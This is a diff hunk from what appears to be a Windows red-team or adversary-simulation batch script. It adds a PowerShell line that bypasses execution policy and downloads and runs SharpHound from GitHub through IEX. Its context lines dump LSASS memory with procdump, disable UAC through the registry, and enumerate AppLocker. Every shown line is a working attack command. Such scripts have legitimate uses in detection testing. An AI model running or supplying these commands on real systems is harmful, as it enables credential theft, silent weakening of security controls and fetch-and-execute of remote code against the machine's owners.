@@ -434,6 +434,8 @@ procdump.exe -ma lsass.exe C:\Users\Administrator\Desktop\x64\lsass.dmp
 ECHO ============================
 start C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
 ECHO ============================
+powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound"
+ECHO ============================
 subst k: %temp%
 ECHO ============================
 "powershell.exe" -nop -c "import-module applocker; get-command *applocker*
